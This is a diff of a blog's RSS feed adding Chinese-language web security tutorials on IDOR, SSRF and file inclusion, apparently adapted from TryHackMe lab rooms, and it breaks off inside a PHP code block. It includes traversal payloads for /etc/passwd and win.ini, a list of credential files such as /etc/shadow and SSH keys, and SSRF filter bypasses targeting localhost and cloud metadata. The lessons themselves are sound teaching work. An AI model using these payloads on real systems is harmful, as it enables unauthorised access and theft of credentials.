@@ -343,6 +343,136 @@
 </description>
         </item>
         <item>
+        <title>IDOR基础</title>
+        <link>https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/</link>
+        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
+        
+        <guid>https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/</guid>
+        <description>&lt;h1 id=&#34;idor基础&#34;&gt;IDOR基础
+&lt;/h1&gt;&lt;h2 id=&#34;什么是idor&#34;&gt;什么是IDOR
+&lt;/h2&gt;&lt;p&gt;IDOR（ Insecure Direct Object Reference） 代表不安全的直接对象引用，是一种访问控制漏洞。&lt;/p&gt;
+&lt;p&gt;当 Web 服务器收到用户提供的输入以检索对象（文件、数据、文档），对输入数据给予了太多信任，并且未在服务器端对其进行验证以确认所请求的对象属于请求它的用户时，就会发生这种类型的漏洞。&lt;/p&gt;
+&lt;h2 id=&#34;示例&#34;&gt;示例
+&lt;/h2&gt;&lt;p&gt;假设您刚刚注册了一项在线服务，并且想要更改您的个人资料信息。您单击的链接将转到 &lt;a class=&#34;link&#34; href=&#34;http://online-service.thm/profile?user_id=1305&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://online-service.thm/profile?user_id=1305&lt;/a&gt;，您可以看到您的信息。&lt;/p&gt;
+&lt;p&gt;好奇心让您尝试将 user_id 值更改为 1000 （http://online-service.thm/profile?user_id=1000），令您惊讶的是，您现在可以看到其他用户的信息。您现在发现了一个 IDOR 漏洞！理想情况下，应该在网站上进行检查，以确认用户信息属于请求它的用户。&lt;/p&gt;
+&lt;h2 id=&#34;在编码中发现idor&#34;&gt;在编码中发现IDOR
+&lt;/h2&gt;&lt;p&gt;当通过帖子数据、查询字符串或 cookie 将数据从一个页面传递到另一个页面时，Web 开发人员通常首先会获取原始数据并对其进行编码。编码可确保接收 Web 服务器能够理解内容。编码将二进制数据转换为 ASCII 字符串，通常使用 &lt;code&gt;a-z、A-Z、0-9 和 = &lt;/code&gt;字符 用于填充。Web 上最常见的编码技术是 base64 编码，通常很容易被发现。您可以使用网站 Like &lt;a class=&#34;link&#34; href=&#34;https://www.base64decode.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.base64decode.org/&lt;/a&gt; 解码字符串，然后编辑数据并使用 &lt;a class=&#34;link&#34; href=&#34;https://www.base64encode.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.base64encode.org/&lt;/a&gt; 再次重新编码，然后重新提交 Web 请求以查看响应是否有更改。&lt;/p&gt;
+&lt;p&gt;请参阅下图作为此过程的图形示例：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/image-20250319134915800.png&#34;
+	width=&#34;1183&#34;
+	height=&#34;96&#34;
+	srcset=&#34;https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/image-20250319134915800_hu_d0f131ae56f606cc.png 480w, https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/image-20250319134915800_hu_9a54cc0d0e68c012.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1232&#34;
+		data-flex-basis=&#34;2957px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;哈希idor&#34;&gt;哈希IDOR
+&lt;/h2&gt;&lt;p&gt;散 列 ID 比编码的 ID 要复杂一些，但它们可能遵循可预测的模式，例如是整数值的哈希版本。例如，如果使用 md5 哈希，则 ID 号 123 将变为 202cb962ac59075b964b07152d234b70。&lt;/p&gt;
+&lt;p&gt;值得将任何发现的哈希值通过 Web 服务，例如 &lt;a class=&#34;link&#34; href=&#34;https://crackstation.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://crackstation.net/&lt;/a&gt;（它有一个包含数十亿个 hash to value 结果的数据库），看看我们是否能找到任何匹配项。&lt;/p&gt;
+&lt;h2 id=&#34;unpredictable-ids&#34;&gt;Unpredictable IDs
+&lt;/h2&gt;&lt;p&gt;如果使用上述方法无法检测到 ID，则 IDOR 检测的一个很好的方法是创建两个帐户并在它们之间交换 ID 号。如果您可以使用其他用户的 ID 号查看其他用户的内容，同时仍然使用其他账户登录（或根本未登录），则您发现了有效的 IDOR 漏洞。&lt;/p&gt;
+&lt;h2 id=&#34;idor在哪里&#34;&gt;IDOR在哪里
+&lt;/h2&gt;&lt;p&gt;您所针对的易受攻击的终端节点可能并不总是您在地址栏中看到的。它可能是您的浏览器通过 AJAX 请求加载的内容，或者您在 JavaScript 文件中找到引用的内容。&lt;/p&gt;
+&lt;p&gt;有时，终端节点可能有一个未引用的参数，该参数可能在开发过程中有所用处，并被推送到生产环境中。例如，您可能会注意到对 &lt;strong&gt;/user/details&lt;/strong&gt; 的调用显示您的用户信息（通过您的会话进行身份验证）。但是通过一种称为参数挖掘的攻击，您发现了一个名为 &lt;strong&gt;user_id&lt;/strong&gt; 的参数，您可以使用它来显示其他用户的信息，例如 &lt;strong&gt;/user/details？user_id=123&lt;/strong&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>SSRF基础</title>
+        <link>https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/</link>
+        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
+        
+        <guid>https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/</guid>
+        <description>&lt;h1 id=&#34;ssrf基础&#34;&gt;SSRF基础
+&lt;/h1&gt;&lt;h2 id=&#34;什么是ssrf&#34;&gt;什么是SSRF
+&lt;/h2&gt;&lt;p&gt;SSRF 代表服务器端请求伪造。这是一个漏洞，允许恶意用户使 Web 服务器向攻击者选择的资源发出额外或经过编辑的 HTTP 请求。&lt;/p&gt;
+&lt;h2 id=&#34;ssrf-的类型&#34;&gt;SSRF 的类型
+&lt;/h2&gt;&lt;p&gt;SSRF 漏洞有两种类型;第一个是常规 SSRF，其中数据返回到攻击者的屏幕。第二个是盲目 SSRF 漏洞，其中发生了 SSRF，但没有信息返回到攻击者的屏幕。&lt;/p&gt;
+&lt;h2 id=&#34;影响是什么&#34;&gt;影响是什么？
+&lt;/h2&gt;&lt;p&gt;成功的 SSRF 攻击可能导致以下任何情况：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;进入未经授权的区域。&lt;/li&gt;
+&lt;li&gt;访问客户/组织数据。&lt;/li&gt;
+&lt;li&gt;能够扩展到内部网络。&lt;/li&gt;
+&lt;li&gt;显示身份验证令牌/凭据。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;查找ssrf漏洞&#34;&gt;查找SSRF漏洞
+&lt;/h2&gt;&lt;p&gt;可以通过多种不同的方式在 Web 应用程序中发现潜在的 SSRF 漏洞。以下是四个常见位置的示例：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;当地址栏的参数中使用完整 URL 时：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153429518.png&#34;
+	width=&#34;843&#34;
+	height=&#34;68&#34;
+	srcset=&#34;https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153429518_hu_9511d7293a12d634.png 480w, https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153429518_hu_182c0825e56883bf.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1239&#34;
+		data-flex-basis=&#34;2975px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;表单中的隐藏字段：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153443076.png&#34;
+	width=&#34;686&#34;
+	height=&#34;159&#34;
+	srcset=&#34;https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153443076_hu_c47dd9ff6d21a905.png 480w, https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153443076_hu_b6eab2e01c865fd3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;431&#34;
+		data-flex-basis=&#34;1035px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;部分 URL，例如主机名：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153458456.png&#34;
+	width=&#34;522&#34;
+	height=&#34;70&#34;
+	srcset=&#34;https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153458456_hu_5e7b360a2ad68b1f.png 480w, https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153458456_hu_ee35ce65e1026059.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;745&#34;
+		data-flex-basis=&#34;1789px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;或者可能只是 URL 的路径：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153510906.png&#34;
+	width=&#34;695&#34;
+	height=&#34;84&#34;
+	srcset=&#34;https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153510906_hu_ccf6309cfad93253.png 480w, https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153510906_hu_d30421f7817b0ac5.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;827&#34;
+		data-flex-basis=&#34;1985px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;其中一些示例比其他示例更容易被利用，因此需要进行大量试验和错误才能找到有效的有效负载。&lt;/p&gt;
+&lt;p&gt;如果使用盲 SSRF，并且没有输出反射给您，则需要使用外部 HTTP 日志记录工具来监控请求，例如 requestbin.com、您自己的 HTTP 服务器或 Burp Suite 的协作者客户端。&lt;/p&gt;
+&lt;h2 id=&#34;常见的防御手段与应对&#34;&gt;常见的防御手段与应对
+&lt;/h2&gt;&lt;p&gt;更了解安全漏洞的开发人员意识到 SSRF 漏洞的风险，可以在其应用程序中实施检查，以确保请求的资源符合特定规则。通常有两种方法，拒绝列表或允许列表。&lt;/p&gt;
+&lt;h3 id=&#34;拒绝列表&#34;&gt;拒绝列表
+&lt;/h3&gt;&lt;p&gt;在拒绝列表 （Deny List） 中，接受除列表中指定的资源或与特定模式匹配的资源之外的所有请求。Web 应用程序可以使用拒绝列表来保护敏感端点、IP 地址或域不被公众访问，同时仍允许访问其他位置。限制访问的特定端点是 localhost，它可能包含服务器性能数据或其他敏感信息，因此 localhost 和 127.0.0.1 等域名会出现在拒绝列表中。攻击者可以使用替代本地主机引用绕过拒绝列表，例如 0、0.0.0.0、0000、127.1、127.&lt;em&gt;.&lt;/em&gt;.*、2130706433、017700000001 或具有解析为 IP 地址 127.0.0.1 的 DNS 记录的子域，例如 127.0.0.1.nip.io。&lt;/p&gt;
+&lt;p&gt;此外，在云环境中，阻止对 IP 地址 169.254.169.254 的访问将是有益的，该地址包含已部署云服务器的元数据，包括可能的敏感信息。攻击者可以通过在自己的域上注册一个子域来绕过此问题，该子域的 DNS 记录指向 IP 地址 169.254.169.254。&lt;/p&gt;
+&lt;h3 id=&#34;允许列表&#34;&gt;允许列表
+&lt;/h3&gt;&lt;p&gt;在允许列表中，除非所有请求都显示在列表中或与特定模式匹配，例如参数中使用的 URL 必须以 &lt;a class=&#34;link&#34; href=&#34;https://website.thm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://website.thm&lt;/a&gt; 开头的规则，否则所有请求都会被拒绝。攻击者可以通过在攻击者的域名上创建子域（例如 &lt;a class=&#34;link&#34; href=&#34;https://website.thm.attackers-domain.thm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://website.thm.attackers-domain.thm&lt;/a&gt;）来快速规避此规则。应用程序逻辑现在将允许此输入，并允许攻击者控制内部 HTTP 请求。&lt;/p&gt;
+&lt;h3 id=&#34;打开重定向&#34;&gt;打开重定向
+&lt;/h3&gt;&lt;p&gt;如果上述绕过不起作用，那么攻击者还有一个技巧，即开放重定向。开放重定向是服务器上的一个端点，网站访问者会在其中自动重定向到另一个网站地址。以 link https://website 为例。thm/link？url=https：//tryhackme.com 的创建此端点是为了记录访客出于广告/营销目的点击此链接的次数。但是想象一下，存在一个潜在的 SSRF 漏洞，其严格的规则只允许以 https://website 开头的 URL。thm/。攻击者可以利用上述功能将内部 HTTP 请求重定向到攻击者选择的域。&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>身份验证绕过</title>
         <link>https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/</link>
         <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
@@ -537,6 +667,315 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;这个字符串 base64 解码的值为 &lt;strong&gt;{“id”：1，“admin”： false}&lt;/strong&gt; ，然后我们可以再次将其编码回 base64 编码，但将 admin 值设置为 true，这现在为我们提供了管理员访问权限。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>文件包含基础</title>
+        <link>https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/</link>
+        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
+        
+        <guid>https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/</guid>
+        <description>&lt;h1 id=&#34;文件包含基础&#34;&gt;文件包含基础
+&lt;/h1&gt;&lt;h2 id=&#34;介绍&#34;&gt;介绍
+&lt;/h2&gt;&lt;p&gt;此房间旨在为您提供利用文件包含漏洞的基本知识，包括本地文件包含 （LFI）、远程文件包含 （RFI） 和目录遍历。此外，我们还将讨论发现这些漏洞的风险以及所需的补救措施。我们提供了每个漏洞的一些实际示例以及实践挑战。&lt;/p&gt;
+&lt;p&gt;在某些情况下，编写 Web 应用程序是为了通过参数请求访问给定系统上的文件，包括图像、静态文本等。参数是附加到 URL 的查询参数字符串，可用于检索数据或根据用户输入执行作。 下图分解了 URL 的基本部分。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135235271.png&#34;
+	width=&#34;808&#34;
+	height=&#34;383&#34;
+	srcset=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135235271_hu_f57287e6d811ed.png 480w, https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135235271_hu_da64751108a44094.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;210&#34;
+		data-flex-basis=&#34;506px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;例如，参数用于 Google 搜索，其中 GET 请求将用户输入传递到搜索引擎中。 &lt;a class=&#34;link&#34; href=&#34;https://www.google.com/search?q=TryHackMe&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.google.com/search?q=TryHackMe&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;让我们讨论一个用户请求从 Web 服务器访问文件的场景。首先，用户向 Web 服务器发送一个 HTTP 请求，其中包含要显示的文件。例如，如果用户想要在 Web 应用程序中访问和显示其 CV，则请求可能如下所示，http://webapp.thm/get.php?file=userCV.pdf，其中 file 是参数，userCV.pdf是要访问的必需文件。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135313594.png&#34;
+	width=&#34;1189&#34;
+	height=&#34;552&#34;
+	srcset=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135313594_hu_a4068aa13869e613.png 480w, https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135313594_hu_1ace6a5555f9956f.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;215&#34;
+		data-flex-basis=&#34;516px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;为什么会出现文件包含漏洞&#34;&gt;为什么会出现文件包含漏洞？
+&lt;/h3&gt;&lt;p&gt;文件包含漏洞通常在 Web 应用程序（如 PHP ）的各种编程语言 中发现和利用，这些应用程序编写和实现都很糟糕。这些漏洞的主要问题是输入验证，其中用户输入没有经过清理或验证，由用户控制它们。当输入未经过验证时，用户可以将任何输入传递给函数，从而导致漏洞。&lt;/p&gt;
+&lt;h3 id=&#34;文件包含有什么风险&#34;&gt;文件包含有什么风险？
+&lt;/h3&gt;&lt;p&gt;默认情况下，攻击者可以利用文件包含漏洞来泄露数据，例如代码、凭据或与 Web 应用程序或作系统相关的其他重要文件。此外，如果攻击者可以通过任何其他方式将文件写入服务器，则文件包含可能会协同使用以获得远程命令执行 （RCE）。&lt;/p&gt;
+&lt;h2 id=&#34;路径遍历&#34;&gt;路径遍历
+&lt;/h2&gt;&lt;p&gt;也称为目录遍历，允许攻击者读取作系统资源，例如运行应用程序的服务器上的本地文件。攻击者通过纵和滥用 Web 应用程序的 URL 来查找和访问存储在应用程序根目录之外的文件或目录，从而利用此漏洞。&lt;/p&gt;
+&lt;p&gt;当用户的输入传递到 PHP 中的 file_get_contents 等函数时，会出现路径遍历漏洞。请务必注意，该函数并不是导致此漏洞的主要因素。通常，糟糕的输入验证或筛选是导致此漏洞的原因。在 PHP 中，您可以使用 file_get_contents 读取文件的内容。&lt;/p&gt;
+&lt;p&gt;下图显示了 Web 应用程序如何在 &lt;code&gt;/var/www/app&lt;/code&gt; 中存储文件。满意的路径是用户请求 从定义的路径 &lt;code&gt;/var/www/app/CVs userCV.pdf&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135502038.png&#34;
+	width=&#34;1388&#34;
+	height=&#34;594&#34;
+	srcset=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135502038_hu_f2670e2d3db27160.png 480w, https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135502038_hu_89fa0c7b875e8386.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;233&#34;
+		data-flex-basis=&#34;560px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;我们 可以通过添加有效负载来测试 URL 参数，以查看 Web 应用程序的行为方式。路径遍历攻击，也称为点-点-斜杠攻击，利用双点将目录上移一步。 如果攻击者找到入口点，在本例中为 get.php?file=，那么攻击者可能会发送如下内容 &lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/get.php?file=../../../../etc/passwd&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://webapp.thm/get.php?file=../../../../etc/passwd&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;假设没有输入验证，而不是访问 PDF 文件位于 /var/www/app/CVs 位置，则 Web 应用程序会从其他 目录，在本例中为 /etc/passwd。每个 &lt;code&gt;..&lt;/code&gt; 条目都会移动一个目录，直到到达根目录 &lt;code&gt;/&lt;/code&gt;。然后，它将目录更改为 /etc，然后从那里读取 passwd 文件。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135730518.png&#34;
+	width=&#34;694&#34;
+	height=&#34;593&#34;
+	srcset=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135730518_hu_7bcd6ff32f61c9d6.png 480w, https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135730518_hu_3fb6401bb725182f.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;117&#34;
+		data-flex-basis=&#34;280px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;因此，Web 应用程序将文件的内容发送回给用户。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135753945.png&#34;
+	width=&#34;941&#34;
+	height=&#34;466&#34;
+	srcset=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135753945_hu_5421b849f2521391.png 480w, https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319135753945_hu_3db6ffff0bb1f9e8.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;201&#34;
+		data-flex-basis=&#34;484px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;同样，如果 Web 应用程序在 Windows 服务器上运行，攻击者需要提供 Windows 路径。例如，如果攻击者想要读取位于c:\boot.ini 中的 boot.ini 文件，则攻击者可以根据目标尝试以下作 作系统版本：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://webapp.thm/get.php?file=../../../../boot.ini 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;或
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://webapp.thm/get.php?file=../../../../windows/win.ini
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;与 Linux作系统相同的概念在这里适用，在这种作系统中，我们爬上目录直到它到达根目录，这通常是 .&lt;/p&gt;
+&lt;p&gt;有时，开发人员会添加过滤器以限制仅访问某些文件或目录。以下是测试时可以使用的一些常见作系统文件。&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;位置&lt;/th&gt;
+          &lt;th&gt;描述&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/etc/issue&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;包含要在登录提示之前打印的消息或系统标识。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/etc/profile&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;控制系统范围的默认变量，如导出变量、文件创建掩码 （umask）、终端类型、邮件消息，以指示新邮件何时到达&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/proc/version&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;指定 Linux 内核的版本&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;etc/passwd&lt;/code&gt; &lt;code&gt;等/passwd&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;具有有权访问系统的所有注册用户&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;包含有关系统用户密码的信息&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/root/.bash_history&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;包含 &lt;code&gt;root &lt;/code&gt;用户的 history 命令&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/var/log/dmessage&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;包含全局系统消息，包括系统启动期间记录的消息&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;`/var/mail/root&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;根&lt;/code&gt;用户的所有电子邮件&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/root/.ssh/id_rsa&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;服务器上 root 或任何已知有效用户的私有 SSH 密钥&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;/var/log/apache2/access.log&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;Web 服务器的&lt;/code&gt;访问请求&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;C:\boot.ini&lt;/code&gt; &lt;code&gt;C：\boot.ini&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;包含具有 BIOS 固件的计算机的启动选项&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;本地文件包含-lfi&#34;&gt;本地文件包含 LFI
+&lt;/h2&gt;&lt;h3 id=&#34;一&#34;&gt;一
+&lt;/h3&gt;&lt;p&gt;针对 Web 应用程序的 LFI 攻击通常是由于开发人员缺乏安全意识。使用 PHP 时，使用 include、require、include_once 和 require_once 等功能通常会导致 Web 应用程序易受攻击。在这个房间里，我们将挑选 PHP，但值得注意的是，使用其他语言（如 ASP、JSP）甚至在 Node.js 应用程序中也会出现 LFI 漏洞。LFI 漏洞利用遵循与路径遍历相同的概念。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PHP&lt;/span&gt; 
